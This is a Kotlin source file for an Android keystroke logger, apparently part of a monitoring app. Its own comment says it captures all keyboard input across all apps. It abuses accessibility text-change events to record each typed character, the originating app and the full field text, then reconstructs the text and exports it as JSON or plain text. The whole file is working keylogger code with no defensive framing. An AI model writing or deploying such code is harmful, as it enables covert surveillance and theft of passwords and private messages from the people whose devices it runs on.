package com.sync.xxx.managers

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * KeystrokeManager.kt
 * Advanced keystroke logging with character-level tracking
 * Monitors all keyboard input across all apps
 */
class KeystrokeManager(private val context: Context) {

    private val TAG = "KeystrokeManager"
    
    private val keystrokeQueue = ConcurrentLinkedQueue<KeystrokeEntry>()
    private var isEnabled = false
    private var keystrokeListener: ((KeystrokeEntry) -> Unit)? = null
    private var previousText = ""
    
    private val maxQueueSize = 2000

    /**
     * Check if accessibility service is enabled
     */
    fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        
        return !enabledServices.isNullOrEmpty() && enabledServices.contains(context.packageName)
    }

    /**
     * Start keystroke logging
     */
    fun startLogging(listener: ((KeystrokeEntry) -> Unit)? = null) {
        if (!isAccessibilityEnabled()) {
            Log.e(TAG, "Accessibility service not enabled")
            return
        }

        isEnabled = true
        keystrokeListener = listener
        previousText = ""
        Log.d(TAG, "Keystroke logging started")
    }

    /**
     * Stop keystroke logging
     */
    fun stopLogging() {
        isEnabled = false
        keystrokeListener = null
        previousText = ""
        Log.d(TAG, "Keystroke logging stopped")
    }

    /**
     * Process accessibility event
     */
    fun processEvent(event: AccessibilityEvent) {
        if (!isEnabled) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                handleTextChanged(event)
            }
        }
    }

    /**
     * Handle text changed event
     */
    private fun handleTextChanged(event: AccessibilityEvent) {
        try {
            val currentText = event.text.joinToString("")
            if (currentText.isEmpty()) return

            val packageName = event.packageName?.toString() ?: "unknown"
            val className = event.className?.toString() ?: "unknown"
            
            // Detect keystroke type
            val keystrokeType = detectKeystrokeType(previousText, currentText)
            val character = extractCharacter(previousText, currentText, keystrokeType)
            
            if (character != null) {
                val entry = KeystrokeEntry(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    className = className,
                    character = character,
                    keystrokeType = keystrokeType,
                    fullText = currentText
                )
                
                addEntry(entry)
            }
            
            previousText = currentText
        } catch (e: Exception) {
            Log.e(TAG, "Error handling text changed", e)
        }
    }

    /**
     * Detect keystroke type
     */
    private fun detectKeystrokeType(oldText: String, newText: String): KeystrokeType {
        return when {
            newText.length > oldText.length -> KeystrokeType.ADDED
            newText.length < oldText.length -> KeystrokeType.DELETED
            else -> KeystrokeType.MODIFIED
        }
    }

    /**
     * Extract changed character
     */
    private fun extractCharacter(oldText: String, newText: String, type: KeystrokeType): String? {
        return when (type) {
            KeystrokeType.ADDED -> {
                if (newText.length == oldText.length + 1) {
                    // Find the added character
                    for (i in newText.indices) {
                        if (i >= oldText.length || newText[i] != oldText[i]) {
                            return newText[i].toString()
                        }
                    }
                    newText.last().toString()
                } else {
                    newText.substring(oldText.length)
                }
            }
            KeystrokeType.DELETED -> {
                if (oldText.length == newText.length + 1) {
                    // Find the deleted character
                    for (i in oldText.indices) {
                        if (i >= newText.length || oldText[i] != newText[i]) {
                            return oldText[i].toString()
                        }
                    }
                    oldText.last().toString()
                } else {
                    oldText.substring(newText.length)
                }
            }
            KeystrokeType.MODIFIED -> {
                newText.lastOrNull()?.toString()
            }
        }
    }

    /**
     * Add keystroke entry
     */
    private fun addEntry(entry: KeystrokeEntry) {
        keystrokeQueue.add(entry)
        keystrokeListener?.invoke(entry)
        
        if (keystrokeQueue.size > maxQueueSize) {
            val excess = keystrokeQueue.size - (maxQueueSize / 2)
            repeat(excess) {
                keystrokeQueue.poll()
            }
            Log.d(TAG, "Queue overflow, removed $excess old entries")
        }
    }

    /**
     * Get all keystroke entries
     */
    fun getAllEntries(): List<KeystrokeEntry> {
        return keystrokeQueue.toList()
    }

    /**
     * Get entries from specific package
     */
    fun getEntriesFromPackage(packageName: String): List<KeystrokeEntry> {
        return keystrokeQueue.filter { it.packageName == packageName }
    }

    /**
     * Get entries within time range
     */
    fun getEntriesInTimeRange(startTime: Long, endTime: Long): List<KeystrokeEntry> {
        return keystrokeQueue.filter { it.timestamp in startTime..endTime }
    }

    /**
     * Reconstruct typed text from entries
     */
    fun reconstructText(entries: List<KeystrokeEntry>): String {
        return entries.joinToString("") { it.character }
    }

    /**
     * Clear all entries
     */
    fun clearEntries() {
        keystrokeQueue.clear()
        Log.d(TAG, "All entries cleared")
    }

    /**
     * Get entries as JSON
     */
    fun getEntriesAsJson(): JSONArray {
        val jsonArray = JSONArray()
        keystrokeQueue.forEach { entry ->
            jsonArray.put(entry.toJson())
        }
        return jsonArray
    }

    /**
     * Export entries to string
     */
    fun exportEntries(): String {
        val sb = StringBuilder()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        keystrokeQueue.forEach { entry ->
            sb.append("${dateFormat.format(Date(entry.timestamp))} | ")
            sb.append("${entry.packageName} | ")
            sb.append("${entry.keystrokeType} | ")
            sb.append("'${entry.character}'\n")
        }
        
        return sb.toString()
    }

    /**
     * Get queue size
     */
    fun getQueueSize(): Int = keystrokeQueue.size

    /**
     * Check if logging is active
     */
    fun isEnabled(): Boolean = isEnabled

    /**
     * Keystroke type enum
     */
    enum class KeystrokeType {
        ADDED,
        DELETED,
        MODIFIED
    }

    /**
     * Data class for keystroke entry
     */
    data class KeystrokeEntry(
        val timestamp: Long,
        val packageName: String,
        val className: String,
        val character: String,
        val keystrokeType: KeystrokeType,
        val fullText: String
    ) {
        fun toJson(): JSONObject {
            return JSONObject().apply {
                put("timestamp", timestamp)
                put("packageName", packageName)
                put("className", className)
                put("character", character)
                put("keystrokeType", keystrokeType.name)
                put("fullText", fullText)
                put("date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
            }
        }
    }
}
